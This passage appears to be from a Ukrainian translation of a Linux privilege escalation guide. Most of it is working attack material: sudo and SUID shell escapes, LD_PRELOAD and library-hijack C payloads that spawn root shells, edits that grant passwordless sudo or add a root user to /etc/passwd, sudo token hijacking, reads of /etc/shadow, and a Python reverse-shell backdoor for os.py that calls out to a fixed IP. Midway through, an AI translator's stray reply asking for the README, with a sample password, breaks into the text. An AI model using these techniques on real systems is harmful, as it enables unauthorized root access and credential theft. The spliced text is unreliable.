echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти під кожного користувача**, використовуючи цей пароль.

### Su Brute

Якщо вам не важливий великий шум і на комп'ютері присутні бінарні файли `su` і `timeout`, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записом у $PATH

### $PATH

Якщо ви виявите, що можете **записувати в якусь папку з $PATH**, ви можете підвищити привілеї, **створивши backdoor у записній папці** з іменем команди, яка буде виконана іншим користувачем (бажано root), і яка **не завантажується з папки, що розташована раніше** за вашу записну папку в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певну команду за допомогою sudo або вона може мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **несподівані команди дозволяють читати і/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація sudo може дозволяти користувачу виконувати певні команди з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, тепер тривіально отримати shell, додавши ssh key у кореневий каталог або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачеві **set an environment variable** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **based on HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну python library під час виконання скрипта від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo обход шляхів виконання

**Перейдіть** щоб прочитати інші файли або використайте **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без вказаного шляху до команди

Якщо **sudo permission** надається для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_ ви можете скористатися цим, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** бінарний файл **виконує іншу команду, не вказуючи шлях до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID бінарного файлу)**.

[Приклади Payload для виконання.](payloads-to-execute.md)

### SUID бінарний файл зі шляхом до команди

Якщо **suid** бінарний файл **виконує іншу команду з вказаним шляхом**, тоді ви можете спробувати **export a function** з іменем тієї команди, яку викликає suid файл.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_ вам потрібно спробувати створити функцію та export її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid бінарний файл, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказівки однієї або кількох спільних бібліотек (.so files), які мають бути завантажені завантажувачем перед усіма іншими, включно зі стандартною C-бібліотекою (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи та запобігти використанню цієї можливості для експлуатації, особливо щодо **suid/sgid** виконуваних файлів, система вводить певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів з suid/sgid попередньо завантажуються лише бібліотеки в стандартних шляхах, які також мають suid/sgid.

Ескалація привілеїв може статися, якщо ви маєте можливість виконувати команди з `sudo`, і вивід `sudo -l` містить запис **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися й розпізнаватися навіть при виконанні команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Зберегти як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** шляхом запуску
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Схожим privesc можна зловживати, якщо зловмисник контролює змінну оточення **LD_LIBRARY_PATH**, оскільки він контролює шлях пошуку бібліотек.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли ви натрапляєте на бінарний файл з **SUID** дозволами, який виглядає підозріло, корисно перевірити, чи він правильно завантажує **.so** файли. Це можна перевірити, виконавши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, зіткнення з помилкою на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ свідчить про потенційну можливість експлуатації.

Щоб її використати, слід створити C-файл, скажімо _"/path/to/.config/libcalc.c"_, який містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та запуску, має на меті elevate privileges шляхом маніпулювання правами доступу до файлів і виконання shell з elevated privileges.

Скомпілюйте вищенаведений C-файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID бінарного файлу має спровокувати exploit, що дозволяє потенційно скомпрометувати систему.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує бібліотеку з папки, у яку ми можемо записувати, створімо бібліотеку в цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський список Unix-бінарників, які можуть бути використані атакуючим для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **лише вставляти аргументи** в команду.

Проект збирає легітимні функції Unix-бінарників, якими можна зловживати для виходу з обмежених shell-ів, ескалації або підтримки підвищених привілеїв, передачі файлів, створення bind та reverse shells, і полегшення інших post-exploitation завдань.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви можете виконати `sudo -l`, ви можете використовувати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи знайде він спосіб експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли ви маєте **sudo access**, але не маєте пароля, ви можете підвищити привілеї, **чекаючи виконання команди sudo і перехопивши сесіонний токен**.

Вимоги для ескалації привілеїв:

- Ви вже маєте shell як користувач "_sampleuser_"
- "_sampleuser_" **використав `sudo`** для виконання чогось протягом **останніх 15 хвилин** (за замовчуванням це тривалість sudo token, що дозволяє використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має повертати 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово ввімкнути `ptrace_scope` командою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете ескалювати привілеї використавши:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Перший експлойт (`exploit.sh`) створить бінар `activate_sudo_token` в _/tmp_. Ви можете використати його, щоб **активувати sudo token у вашій сесії** (ви не отримаєте автоматично root shell, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Другий **exploit** (`exploit_v2.sh`) створить sh shell в _/tmp_ **що належить root із setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) створить **sudoers file**, який робить **sudo tokens вічними та дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права запису** у папці або на будь-яких файлах, створених всередині папки, ви можете використати бінарний файл [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell під цим користувачем з PID 1234, ви можете **отримати права sudo**, не знаючи пароля, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли в директорії `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **підвищити привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо у вас є права на запис, ви можете зловживати цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD — перевірте його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв і ви отримали shell у контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконуватиме ваш код від імені root, а потім команду користувача. Потім **змінити $PATH** у контексті користувача (наприклад додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, виконається ваш sudo виконуваний файл.

Зауважте, що якщо користувач використовує інший shell (не bash), вам доведеться змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ви можете знайти ще один приклад у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, звідки беруться **завантажені конфігураційні файли**. Зазвичай цей файл містить такий шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть прочитані конфігураційні файли з `/etc/ld.so.conf.d/*.conf`. Ці конфігураційні файли **вказують на інші папки**, в яких будуть **шукатися** **бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** у будь-який із вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яка папка, вказана у конфігураційному файлі всередині `/etc/ld.so.conf.d/*.conf`, він може зуміти підвищити привілеї.\
Подивіться, **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Скопіювавши бібліотеку в `/var/tmp/flag15/`, вона буде використана програмою в цьому місці, як вказано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають процесу **підмножину доступних привілеїв root**. Це фактично розбиває root **привілеї на менші та відмінні одиниці**. Кожну з цих одиниць можна окремо надавати процесам. Таким чином повний набір привілеїв зменшується, знижуючи ризики експлуатації.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до директорій

У директорії біт **"execute"** означає, що відповідний користувач може **"cd"** у папку.\
Біт **"read"** означає, що користувач може **переглядати список** **файлів**, а біт **"write"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Access Control Lists (ACLs) представляють собою вторинний рівень довільних дозволів, здатний **перевизначати традиційні ugo/rwx permissions**. Ці дозволи покращують контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або членами групи. Така ступінь **granularity забезпечує більш точне керування доступом**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Дайте** користувачу "kali" права читання та запису на файл:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs у системі:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell sessions

У **старих версіях** ви можете **hijack** деяку **shell** сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** до screen sessions лише **your own user**. Проте всередині сесії можна знайти **цікаву інформацію**.

### screen sessions hijacking

**Перелічити screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема зі **старими версіями tmux**. Мені не вдалося hijack сесію tmux (v2.1), створену root, будучи непривілейованим користувачем.

**Перелік сесій tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перегляньте приклад у **Valentine box from HTB**.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH ключі, згенеровані в системах на базі Debian (Ubuntu, Kubuntu, etc) між вереснем 2006 і 13 травня 2008 року можуть постраждати від цієї вразливості.\
Ця помилка виникає під час створення нового ssh ключа в цих ОС, оскільки було можливих **лише 32,768 варіацій**. Це означає, що всі можливості можна обчислити, і **маючи ssh публічний ключ, ви можете знайти відповідний приватний ключ**. Ви можете знайти обчислені варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація за паролем. Значення за замовчуванням — `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена автентифікація за публічним ключем. Значення за замовчуванням — `yes`.
- **PermitEmptyPasswords**: Якщо дозволена автентифікація за паролем, визначає, чи дозволяє сервер вхід в облікові записи з пустими рядками паролів. Значення за замовчуванням — `no`.

### PermitRootLogin

Визначає, чи може root входити через ssh, значення за замовчуванням — `no`. Можливі значення:

- `yes`: root може входити за допомогою пароля та приватного ключа
- `without-password` or `prohibit-password`: root може входити тільки з приватним ключем
- `forced-commands-only`: Root може входити лише за допомогою приватного ключа і якщо вказані commands опції
- `no` : ні

### AuthorizedKeysFile

Визначає файли, що містять публічні ключі, які можна використовувати для автентифікації користувача. Він може містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказувати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (без passphrases!) на сервері. Таким чином ви зможете **jump** через ssh **to a host** і звідти **jump to another** host **using** той **key**, що знаходиться на вашому **initial host**.

Потрібно встановити цю опцію в `$HOME/.ssh.config` ось так:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` є `*`, щоразу коли користувач підключається до іншої машини, цей хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписувати** ці **опції** і дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для підвищення привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову оболонку**. Тому, якщо ви можете **записати або змінити будь-який з них, ви можете підвищити привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено якийсь дивний скрипт профілю, перевірте його на наявність **чутливих деталей**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть використовувати іншу назву або може бути наявна резервна копія. Тому рекомендовано **знайти всі** та **перевірити, чи їх можна прочитати**, щоб дізнатися, **чи є в файлах хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках у файлі `/etc/passwd` (або в еквівалентному файлі) можна знайти **password hashes**.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd доступний для запису

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Мені потрібен вміст файлу src/linux-hardening/privilege-escalation/README.md, щоб його перекласти. Надішліть, будь ласка, сам markdown (повністю).

Також уточніть, будь ласка:
- Чи потрібно просто додати в перекладений README інструкцію (команди) для створення користувача hacker з вставленим згенерованим паролем, чи ви хочете, щоб я тільки згенерував пароль і повернув його окремо?
- Чи підходить формат команди для Linux (наприклад useradd + echo 'пароль' | sudo chpasswd) або ви хочете інший варіант?

Я можу згенерувати пароль зараз. Приклад сильного пароля (можу створити інший, якщо потрібно):
v8$K9pL2!sQ4wZ7@

Підтвердіть, що робити далі, і надішліть вміст README.md для перекладу.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ви тепер можете використати команду `su` з `hacker:hacker`

Як альтернативу, ви можете використати наведені нижче рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може знизити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На платформах BSD файл `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині запущений сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/,** то ви можете змінити такі рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor буде виконано наступного разу, коли tomcat буде запущено.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивні розташування/Owned файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\  
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це програма з відкритим кодом, що використовується для витягання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Логи

Якщо ви можете читати логи, ви можете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший лог, тим цікавішим він, ймовірно.\  
Також деякі "**погано**" налаштовані (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередину audit logs, як описано в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб читати логи, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Вам також слід перевіряти файли, які містять слово "**password**" у **назві** або в **вмісті**, а також шукати IPs та emails у логах або hashes regexps.\
Я не збираюся тут перераховувати, як це все робити, але якщо вам цікаво, можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

Щоб **backdoor the library**, просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP і PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація Logrotate

Уразливість у `logrotate` дозволяє користувачам з **правами запису** у файл логу або в одному з батьківських каталогів потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто запускається від імені **root**, можна змусити виконувати довільні файли, особливо у каталогах на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти дозволи не лише в _/var/log_, але й у будь-якому каталозі, де застосовується ротація логів.

> [!TIP]
